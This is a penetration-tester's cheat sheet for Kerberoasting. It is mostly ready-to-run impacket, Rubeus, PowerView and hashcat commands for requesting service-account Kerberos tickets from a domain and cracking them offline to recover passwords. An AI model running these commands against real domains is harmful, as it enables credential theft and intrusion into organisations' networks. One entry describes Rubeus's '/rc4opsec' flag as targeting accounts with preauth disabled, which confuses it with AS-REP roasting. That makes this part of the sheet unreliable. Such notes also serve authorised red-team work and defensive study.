# Kerberoasting
-  allows an attacker with domain access to extract service account hashes (SPNs) from the domain controller, which can then be cracked offline to recover passwords.
- accounts with SPNs registered are required
- Service accounts are priority
- No need for elevated privileges
## Requirements
- Valid domain user credentials
- Access to port 88
## Tools & Commands

### impacket - GetUserSPNs
```bash
impacket-GetUserSPNs [REALM]/[username]:[password] -dc-ip [IP] -request
```
- Lists service principal names and extracts TGS tickets.
- Output tickets can be cracked using hashcat or john.

### hashcat to crack TGS Tickets
```bash
hashcat -m 13100 [ticket_hashes.txt] [wordlist.txt]
```

### Rubeus

##### Kerberoast all SPNs
```powershell
Rubeus.exe kerberoast
```

##### Output to hashcat format
```powershell
Rubeus.exe kerberoast /outputformat:hashcat
```

##### Only roast accounts with preauth disabled
```powershell
Rubeus.exe kerberoast /rc4opsec
```

### PowerView
```powershell
Get-DomainUser -SPN
Request-SPNTicket -SPN 'service/account'
```